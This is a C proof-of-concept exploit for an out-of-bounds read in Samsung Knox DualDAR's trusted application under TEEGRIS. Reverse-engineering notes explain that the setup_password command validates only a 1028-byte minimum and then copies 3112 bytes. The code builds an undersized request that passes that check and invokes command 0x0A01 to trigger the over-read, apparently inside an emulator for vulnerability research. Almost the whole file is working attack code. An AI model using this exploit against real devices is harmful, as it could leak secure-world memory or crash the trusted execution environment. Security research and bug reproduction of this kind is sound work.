/* dulDAR (Knox DualDAR) — trigger the setup_password dispatcher OOB read.
 *
 * Finding (RE/samsung_teegris/duldar.md "MEDIUM: process_cmd setup-password
 * reads 0xC10 from a 0x404-validated buffer"): process_cmd @0x64A8's
 * setup_password branch validates only `cmd_len >= 0x404` (1028) but then
 *     memcpy(dword_11030, cmd_buf + 24, 0xC10);   // 3088 bytes
 * — a 2060-byte over-read past the validated minimum, out of the request
 * buffer (which the GP entry shell copies onto the redzoned TEE_Malloc heap,
 * so an over-read past its allocation is the asan-catchable direction —
 * same mechanism as HDCP cmd 0xD2).
 *
 * Wire (RE §"GP entry / command table"):
 *   param_types == 0x67 == TEEC_PARAM_TYPES(MEMREF_TEMP_INOUT, MEMREF_TEMP_OUTPUT, NONE, NONE)
 *   params[0] = request (sendmsg), params[1] = response (respmsg)
 *   cmd_id (TEEC commandID) = 0x0A01  (setup_password); bit-31 must be clear
 *   gates: cmd_len(=params[0].size) >= 0x404 (1028)  &&  rsp_len(=params[1].size) > 0xC0F (3087)
 *
 * To make the memcpy over-read, we hand the TA a request buffer SMALLER than
 * 24 + 0xC10 = 3112 bytes — 1028 bytes (just enough to pass the >=0x404 gate)
 * — so reading cmd_buf[24..3112] runs ~2 KB past the 1028-byte heap copy.
 * The response buffer is sized 3100 (> 3087) to pass the second gate.
 *
 * process_cmd runs verify_trusted_boot() (TA-to-TA round-trip to STST) first;
 * the emulator soft-passes it via the duldar branch in
 * custom/session_payload.py:get_good_response_payload.
 */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

#define REQ_SZ   1028      /* >= 0x404, and < 24+0xC10=3112 -> over-read */
#define RSP_SZ   3100      /* >  0xC0F (3087) */
#define CMD_SETUP_PASSWORD 0x0A01u

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null");
    system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null");
    system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-64756c444152";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened\n");

    uint8_t* in  = (uint8_t*)allocate_param_mem(&context, REQ_SZ);
    uint8_t* out = (uint8_t*)allocate_param_mem(&context, RSP_SZ);
    if (!in || !out) { printf("[poc] alloc failed\n"); exit(-1); }

    /* setup_password (cmd) body at +24: [u32 pw_len][u8 pw[]]. Content is
     * irrelevant to the over-READ — fill with a recognisable pattern. */
    memset(in, 0x41, REQ_SZ);
    memset(out, 0, RSP_SZ);
    /* pw_len at +24 (header is 24 bytes); keep it plausible (<=1024). */
    if (REQ_SZ >= 28) { uint32_t pwlen = 1000; memcpy(in + 24, &pwlen, 4); }

    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = REQ_SZ;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = RSP_SZ;

    printf("[poc] >>> invoking setup_password (cmd 0x%x), req=%u (gate>=1028), rsp=%u (gate>3087)\n",
           CMD_SETUP_PASSWORD, REQ_SZ, RSP_SZ);
    res = TEEC_InvokeCommand_impl(&session, CMD_SETUP_PASSWORD, &op, &err_origin);
    printf("[poc] <<< returned 0x%x (%d) origin 0x%x\n", res, (int)res, err_origin);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
